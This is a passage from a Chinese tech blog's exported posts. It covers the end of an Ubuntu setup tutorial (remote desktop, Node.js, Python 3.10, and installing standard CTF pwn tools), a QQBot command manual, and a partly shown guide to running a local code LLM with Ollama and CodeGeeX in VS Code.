图形化界面启动</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl set-default graphical.target</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置开机自启</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> xrdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动与关闭</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start xrdp</span><br><span class="line"><span class="built_in">sudo</span> systemctl stop xrdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 避免ssl证书无法验证，将xrdp用户加入ssl-cert用户组</span></span><br><span class="line"><span class="built_in">sudo</span> adduser xrdp ssl-cert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置后记得重启</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><p>​安装远程连接xrdp的客户端（二选一即可）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gnome-boxes</span><br><span class="line"><span class="built_in">sudo</span> apt install remmina</span><br></pre></td></tr></table></figure><h2 id="Nodejs及npm安装"><a href="#Nodejs及npm安装" class="headerlink" title="Nodejs及npm安装"></a>Nodejs及npm安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果已经安装过Nodejs和npm，为了避免可能出现的问题，建议先卸载原有的</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get remove --purge npm</span><br><span class="line"><span class="built_in">sudo</span> apt-get remove --purge nodejs</span><br><span class="line"><span class="built_in">sudo</span> apt-get remove --purge nodejs-legacy</span><br><span class="line"><span class="built_in">sudo</span> apt-get autoremove</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -r /usr/local/bin/npm</span><br><span class="line"><span class="built_in">rm</span> -r /usr/local/lib/node-moudels</span><br><span class="line">find / -name npm</span><br><span class="line"><span class="built_in">rm</span> -r /tmp/npm*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新源</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nodejs安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install nodejs</span><br><span class="line"><span class="built_in">sudo</span> apt-get install nodejs-legacy</span><br><span class="line"></span><br><span class="line"><span class="comment"># npm安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install npm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新npm包的源</span></span><br><span class="line"><span class="built_in">sudo</span> npm config <span class="built_in">set</span> registry https://registry.npmmirror.com</span><br><span class="line"><span class="built_in">sudo</span> npm config list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局安装n管理器，管理Nodejs版本</span></span><br><span class="line"><span class="built_in">sudo</span> npm install -g n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装最新版本Nodejs</span></span><br><span class="line"><span class="built_in">sudo</span> n stable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 版本检测</span></span><br><span class="line"><span class="built_in">sudo</span> node -v</span><br><span class="line"><span class="built_in">sudo</span> npm -v</span><br></pre></td></tr></table></figure><h2 id="更换python版本"><a href="#更换python版本" class="headerlink" title="更换python版本"></a>更换python版本</h2><p>​有时，系统自带的python版本不符合我们的需要，那么就需要我们自己再重新安装和配置python版本</p><p>​以安装python3.10.4为例</p><h3 id="安装python3-10"><a href="#安装python3-10" class="headerlink" title="安装python3.10"></a>安装python3.10</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接通过apt-get安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install python3.10</span><br></pre></td></tr></table></figure><h4 id="从官网下载自行安装"><a href="#从官网下载自行安装" class="headerlink" title="从官网下载自行安装"></a>从官网下载自行安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev wget libbz2-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从官网下载源文件并解压安装</span></span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">sudo</span> wget https://www.python.org/ftp/python/3.10.4/Python-3.10.4.tgz</span><br><span class="line"><span class="built_in">sudo</span> tar -zvxf Python-3.10.4.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.10.4/</span><br><span class="line">./configure --enable-optimizations  </span><br><span class="line">make</span><br><span class="line"><span class="built_in">sudo</span> make install  <span class="comment"># 不成功则改用sudo make altinstall</span></span><br><span class="line">python3.10 --version  <span class="comment"># 验证是否安装成功，出现版本号则安装成功</span></span><br></pre></td></tr></table></figure><h3 id="更新python默认指向"><a href="#更新python默认指向" class="headerlink" title="更新python默认指向"></a>更新python默认指向</h3><h4 id="修改软链接指向"><a href="#修改软链接指向" class="headerlink" title="修改软链接指向"></a>修改软链接指向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到并删除原有软链接</span></span><br><span class="line"><span class="built_in">which</span> python  <span class="comment"># which命令找到的路径就是原有软链接路径，没有找到说明不存在，可忽略下一条命令</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /usr/bin/python</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到python3.10的安装路径</span></span><br><span class="line"><span class="built_in">which</span> python3.10 <span class="comment"># 我的在/usr/local/bin/python3.10路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新建立软链接</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/local/bin/python3.10 /usr/bin/python</span><br></pre></td></tr></table></figure><p>现在使用<code>python</code>命令显示的就是python3.10.4了</p><h4 id="设置python的环境变量"><a href="#设置python的环境变量" class="headerlink" title="设置python的环境变量"></a>设置python的环境变量</h4><h5 id="编辑-bashrc文件"><a href="#编辑-bashrc文件" class="headerlink" title="编辑.bashrc文件"></a>编辑.bashrc文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim  ~/.bashrc </span><br></pre></td></tr></table></figure><p>找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> python=<span class="string">&#x27;/usr/local/bin/python3.10&#x27;</span></span><br></pre></td></tr></table></figure><p>其中新添加内容的引号中部分换成自己的python安装路径</p><p>最后按下<code>esc</code>，然后依次输入<code>:wq</code>回车即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新环境变量</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="更新pip默认指向"><a href="#更新pip默认指向" class="headerlink" title="更新pip默认指向"></a>更新pip默认指向</h3><h4 id="修改软链接指向-1"><a href="#修改软链接指向-1" class="headerlink" title="修改软链接指向"></a>修改软链接指向</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到并删除原有软链接</span></span><br><span class="line"><span class="built_in">which</span> pip</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /usr/local/bin/pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新建立软链接</span></span><br><span class="line"><span class="comment"># pip路径与python路径一致，上文中python路径在/usr/local/bin/python3.10，那么pip路径在/usr/local/bin/pip3.10</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -s /usr/local/bin/pip3.10 /usr/local/bin/pip</span><br></pre></td></tr></table></figure><p>现在使用pip命令指向的就是python3.10的pip了</p><h1 id="PWN环境配置"><a href="#PWN环境配置" class="headerlink" title="PWN环境配置"></a>PWN环境配置</h1><h2 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install gdb-multiarch</span><br><span class="line">gdb-multiarch -v  <span class="comment"># 查看版本号</span></span><br></pre></td></tr></table></figure><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>主要的攻击武器，本质是一个python库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line">python ./LibcSearcher/setup.py develop</span><br></pre></td></tr></table></figure><h2 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h2><p>动态调试</p><p>如果还未安装gdb，请先安装gdb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gdb</span><br></pre></td></tr></table></figure><p>随后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line">./pwndbg/setup.sh</span><br></pre></td></tr></table></figure><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>检查二进制文件的受保护状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/slimm609/checksec.sh.git</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> ./checksec.sh/checksec /usr/local/bin/checksec  <span class="comment"># 添加为shell命令</span></span><br><span class="line"><span class="built_in">rm</span> checksec.sh  <span class="comment"># 清除多余文件</span></span><br></pre></td></tr></table></figure><h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><h3 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ruby</span><br><span class="line"><span class="built_in">sudo</span> apt install gem</span><br><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure><h3 id="main-arena-offset"><a href="#main-arena-offset" class="headerlink" title="main_arena_offset"></a>main_arena_offset</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bash-c/main_arena_offset</span><br></pre></td></tr></table></figure><h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install gcc ruby-dev</span><br><span class="line"><span class="built_in">sudo</span> gem install seccomp-tools</span><br></pre></td></tr></table></figure><h1 id="可能出现的问题及解决方案"><a href="#可能出现的问题及解决方案" class="headerlink" title="可能出现的问题及解决方案"></a>可能出现的问题及解决方案</h1><h2 id="使用apt更新或安装软件时，提示“由于没有公钥，无法验证下列签名”"><a href="#使用apt更新或安装软件时，提示“由于没有公钥，无法验证下列签名”" class="headerlink" title="使用apt更新或安装软件时，提示“由于没有公钥，无法验证下列签名”"></a>使用apt更新或安装软件时，提示“由于没有公钥，无法验证下列签名”</h2><p>​例如这样的情况</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">W:</span> GPG 错误：https:<span class="symbol">//download.docker.com/linux/ubuntu</span> focal <span class="params">InRelease:</span> 由于没有公钥，无法验证下列签名： NO_PUBKEY <span class="number">7</span>EA0A9C3F273FCD8</span><br><span class="line"><span class="params">E:</span> 仓库 “https:<span class="symbol">//download.docker.com/linux/ubuntu</span> focal InRelease” 没有数字签名。</span><br></pre></td></tr></table></figure><p>​执行以下命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7EA0A9C3F273FCD8</span><br></pre></td></tr></table></figure><p>​注意最后的<code>7EA0A9C3F273FCD8</code>需要根据你的报错提示中给出的<code>NO_PUBKEY</code>进行替换</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 教程 </tag>
            
            <tag> 安装 </tag>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQBot用户使用手册V1.0</title>
      <link href="/post/3dd951cb.html"/>
      <url>/post/3dd951cb.html</url>
      
        <content type="html"><![CDATA[<h2 id="基础说明"><a href="#基础说明" class="headerlink" title="基础说明"></a>基础说明</h2><p>​- By BR</p><p>​本项目基于NapCat+python3.10，是在<a href="https://github.com/MoXueYao/QQBot">QQBot</a>基础上的二次开发，存在个人魔改部分，可在Window及Linux上部署</p><p>​@信息，命令信息，文本信息等，每个信息之间是以一个空格分隔的</p><p>​普通用户权限为1，管理员权限为2，超级管理员权限为3</p><p>​作用范围：friend(仅私聊)，group(仅群聊)，public(私聊与群聊均可)</p><h2 id="命令目录"><a href="#命令目录" class="headerlink" title="命令目录"></a>命令目录</h2><h3 id="help"><a href="#help" class="headerlink" title="&#x2F;help"></a>&#x2F;help</h3><ul><li><p>来源：系统命令</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/help</code></p></li><li><p>作用：查看当前环境下的命令目录</p></li></ul><h3 id="reload"><a href="#reload" class="headerlink" title="&#x2F;reload"></a>&#x2F;reload</h3><ul><li><p>来源：系统命令</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：3</p></li><li><p>用法：<code>/reload</code></p></li><li><p>作用：重载所有插件</p></li></ul><h3 id="点赞"><a href="#点赞" class="headerlink" title="&#x2F;点赞"></a>&#x2F;点赞</h3><ul><li><p>来源：QQ_like插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/点赞 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="keyword">set</span> <span class="symbol">&lt;status&gt;</span>          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    <span class="built_in">add</span> <span class="symbol">&lt;QQ_id&gt;</span>           添加待点赞QQ号</span><br><span class="line">    del <span class="symbol">&lt;QQ_id&gt;</span>           删除待点赞QQ号</span><br></pre></td></tr></table></figure></li><li><p>作用：明天晚上12点整为列表用户的名片点赞</p></li></ul><h3 id="比赛监听"><a href="#比赛监听" class="headerlink" title="&#x2F;比赛监听"></a>&#x2F;比赛监听</h3><ul><li><p>来源：match_monitoring插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/比赛监听 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="keyword">set</span> <span class="symbol">&lt;status&gt;</span>          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    <span class="built_in">add</span> <span class="symbol">&lt;QQ_group_id&gt;</span>     添加通报群聊QQ号</span><br><span class="line">    del <span class="symbol">&lt;QQ_group_id&gt;</span>     删除通报群聊QQ号</span><br></pre></td></tr></table></figure></li><li><p>作用：监听GZCTF平台比赛实况，包括一血二血三血，题目上新，新增公告等的提示</p></li></ul><h3 id="查询比赛"><a href="#查询比赛" class="headerlink" title="&#x2F;查询比赛"></a>&#x2F;查询比赛</h3><ul><li><p>来源：get_match插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/查询比赛 [arguments]</code></p></li><li><p>参数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arguments</span>表示指定页码，默认为<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>作用：查询近期国内网安类比赛，消息来源：<a href="https://github.com/ProbiusOfficial/Hello-CTFtime">ProbiusOfficial&#x2F;Hello-CTFtime: 【Hello CTF】国内外赛事聚合 (github.com)</a></p></li></ul><h3 id="查询国外比赛"><a href="#查询国外比赛" class="headerlink" title="&#x2F;查询国外比赛"></a>&#x2F;查询国外比赛</h3><ul><li><p>来源：get_match插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/查询国外比赛 [arguments]</code></p></li><li><p>参数：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">arguments</span>表示指定页码，默认为<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>作用：查询近期国内网安类比赛，消息来源：<a href="https://github.com/ProbiusOfficial/Hello-CTFtime">ProbiusOfficial&#x2F;Hello-CTFtime: 【Hello CTF】国内外赛事聚合 (github.com)</a></p></li></ul><h3 id="响应群聊"><a href="#响应群聊" class="headerlink" title="&#x2F;响应群聊"></a>&#x2F;响应群聊</h3><ul><li><p>来源：just_group插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/响应群聊 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="keyword">set</span> <span class="symbol">&lt;status&gt;</span>          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    <span class="built_in">add</span> <span class="symbol">&lt;QQ_group_id&gt;</span>     添加允许响应群聊</span><br><span class="line">    del <span class="symbol">&lt;QQ_group_id&gt;</span>     删除允许响应群聊</span><br></pre></td></tr></table></figure></li><li><p>作用：限制Bot能够响应的群聊，在允许响应群聊外的群聊，Bot将会无视其信息</p></li></ul><h3 id="ai"><a href="#ai" class="headerlink" title="&#x2F;ai"></a>&#x2F;ai</h3><ul><li><p>来源：tongyi插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/ai [subcommand]</code></p></li><li><p>参数：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">subcommand:</span></span><br><span class="line">    <span class="keyword">cls</span>          清除发出信息的用户与ai的聊天记录</span><br></pre></td></tr></table></figure></li><li><p>作用：用户层对于ai的管理</p></li></ul><h3 id="ai管理"><a href="#ai管理" class="headerlink" title="&#x2F;ai管理"></a>&#x2F;ai管理</h3><ul><li><p>来源：tongyi插件</p></li><li><p>作用范围：friend</p></li><li><p>权限要求：2</p></li><li><p>用法：<code>/ai管理 [subcommand] [arguments]</code></p></li><li><p>参数：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">subcommand:</span><br><span class="line">    <span class="keyword">set</span> <span class="symbol">&lt;status&gt;</span>          设置插件状态，<span class="string">&quot;True,true,1&quot;</span>表示启用，<span class="string">&quot;False,fasle,0&quot;</span>表示禁用</span><br><span class="line">    <span class="built_in">add</span> <span class="symbol">&lt;QQ_id&gt;</span>       添加黑名单用户</span><br><span class="line">    del <span class="symbol">&lt;QQ_id&gt;</span>       删除黑名单用户</span><br><span class="line">    cls [QQ_id]  清除指定用户与ai的聊天记录(保留预设),未传入QQ_id参数则全清除</span><br><span class="line">    ccls [QQ_id]  清除指定用户与ai的聊天记录(不保留预设),未传入QQ_id参数则全清除</span><br><span class="line">    preset [<span class="keyword">set</span> <span class="symbol">&lt;preset_id&gt;</span>]设置当前预设，若未传入<span class="keyword">set</span>命令，则展示当前使用预设及可选预设</span><br><span class="line">    show将当前存在会话的对话信息保存并以md文档发送给发出命令者</span><br></pre></td></tr></table></figure></li><li><p>作用：管理层对于ai的管理</p></li></ul><h3 id="关于"><a href="#关于" class="headerlink" title="&#x2F;关于"></a>&#x2F;关于</h3><ul><li><p>来源：about插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/关于</code></p></li><li><p>作用：展示Bot基本信息</p></li></ul><h3 id="夸夸"><a href="#夸夸" class="headerlink" title="&#x2F;夸夸"></a>&#x2F;夸夸</h3><ul><li><p>来源：praise插件</p></li><li><p>作用范围：public</p></li><li><p>权限要求：1</p></li><li><p>用法：<code>/夸夸 [argumnets]</code></p></li><li><p>参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">arguments</span>表示对谁使用夸夸，如果不存在该参数，默认对使用命令者使用夸夸</span><br></pre></td></tr></table></figure></li><li><p>作用：从词库中随机抽取夸奖文案并回复</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 我爱发明 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> QQBot </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ollama+CodeGeeX+VScode的本地LLM部署方案</title>
      <link href="/post/31fded05.html"/>
      <url>/post/31fded05.html</url>
      
        <content type="html"><![CDATA[<h1 id="Ollama-CodeGeeX-VScode的本地LLM部署方案"><a href="#Ollama-CodeGeeX-VScode的本地LLM部署方案" class="headerlink" title="Ollama+CodeGeeX+VScode的本地LLM部署方案"></a>Ollama+CodeGeeX+VScode的本地LLM部署方案</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​Windows下实现全离线状态部署LLM用以辅助代码编写</p><hr><h2 id="环境需求"><a href="#环境需求" class="headerlink" title="环境需求"></a>环境需求</h2><ul><li><p>Window10及以上</p></li><li><p>Ollama(版本&gt;0.2)</p></li><li><p>VScode</p></li><li><p>CodeGeeX插件</p></li></ul><hr><h2 id="战前准备"><a href="#战前准备" class="headerlink" title="战前准备"></a>战前准备</h2><p>在进行离线部署前，你需要首先下载好需要的工具及软件</p><h3 id="Ollama下载及安装"><a href="#Ollama下载及安装" class="headerlink" title="Ollama下载及安装"></a>Ollama下载及安装</h3><p>​进入<a href="https://ollama.com/">官方网站</a>下载安装包跟随默认安装即可，给出下载直链<a href="https://ollama.com/download/OllamaSetup.exe">https://ollama.com/download/OllamaSetup.exe</a></p><p>​双击exe文件跟随默认设置安装即可</p><p>​先保留安装包不要删除</p><h3 id="大语言模型下载"><a href="#大语言模型下载" class="headerlink" title="大语言模型下载"></a>大语言模型下载</h3><p>​LLM的选择有很多，根据自身硬件实力选择即可，参考我的轻薄本，使用的是<code>codegeex4:9b-all-q2_K</code>这么一款模型</p><p>​在安装完成Ollama之后，在命令行中执行<code>ollama run codegeex4:9b-all-q2_K</code>即可开始下载，默认下载模型的位置在<code>C:\Users\你的用户名\.ollama\models</code>目录下，当然，你可以通过<code>OLLAMA_MODELS</code>环境变量来修改模型保存位置</p><p>​如果你不想使用这一款大模型，可以在<a href="https://ollama.com/">Ollama</a>官网中自行挑选其他模型</p><p><img src="/../post_img/014c590230fe9bb6e7c008fa4b21a1bd/image-20241204213121200.png" alt="image-20241204213121200"></p><p><img src="/../post_img/014c590230fe9bb6e7c008fa4b21a1bd/image-20241204213157571.png" alt="image-20241204213157571"></p><p><img src="/../post_img/014c590230fe9bb6e7c008fa4b21a1bd/image-20241204213331170.png" alt="image-20241204213331170"></p><p>​将下载好的模型复制(或剪切)出来备用</p><h3 id="VScode下载"><a href="#VScode下载" class="headerlink" title="VScode下载"></a>VScode下载</h3><p>​下载链接<a href="https://code.visualstudio.com/docs/?dv=win64user">https://code.visualstudio.com/docs/?dv=win64user</a></p><h3 id="CodeGeeX插件下载"><a href="#CodeGeeX插件下载" class="headerlink" title="CodeGeeX插件下载"></a>CodeGeeX插件下载</h3><p>​在在线状态下，我们可以直接在扩展商店中搜索<code>CodeGeeX</code>即可一键安装</p><p>​对于离线状态，我们就只能从外部下载好插件后进行进行离线安装</p><p>​通过<a href="https://marketplace.visualstudio.com/items?itemName=aminer.codegeex%E8%BF%9B%E5%85%A5%E6%8B%93%E5%B1%95%E5%95%86%E5%BA%97%E4%B8%8B%E8%BD%BD%E6%8B%93%E5%B1%95%E5%8C%85">https://marketplace.visualstudio.com/items?itemName=aminer.codegeex进入拓展商店下载拓展包</a></p><p><img src="/../post_img/014c590230fe9bb6e7c008fa4b21a1bd/image-20241204211437283.png" alt="image-20241204211437283"></p><hr><h2 id="离线部署"><a href="#离线部署" class="headerlink" title="离线部署"></a>离线部署</h2><p>​接下来的所有操作均可在断网环境下运行</p><p>​首先是安装好Ollama</p><p>​接着将之前下载好的大模型文件放入<code>C:\Users\你的用户名\.ollama\model</code>目录中，使用<code>ollama list</code>命令检验是否读取到了模型文件</p><p>​同时设置好环境变量<code>setx OLLAMA &quot;*&quot; /M</code>（需要管理员权限）</p><p>​然后安装VScode</p><p>​再执行<code>code --install-extension &lt;CodeGeeX插件的路径&gt;</code>命令来安装插件</p><p>​再接下来进行配置</p><p><img src="/../post_img/014c590230fe9bb6e7c008fa4b21a1bd/image-20241204222742783.png" alt="image-20241204222742783"></p><p>​</p><p><img src="/../post_img/014c590230fe9bb6e7c008fa4b21a1bd/image-20241204222946147.png" alt="image-20241204222946147"></p><p>​如图，键入<code>http://127.0.0.1:11434/v1/chat/completions</code>和<code>codegeex4:9b-all-q2_K</code></p><p>​最后点击连接，出现连接成功标识即可</p><p>​至此已完成配置过程</p><h2 id="懒人部署包"><a href="#懒人部署包" class="headerlink" 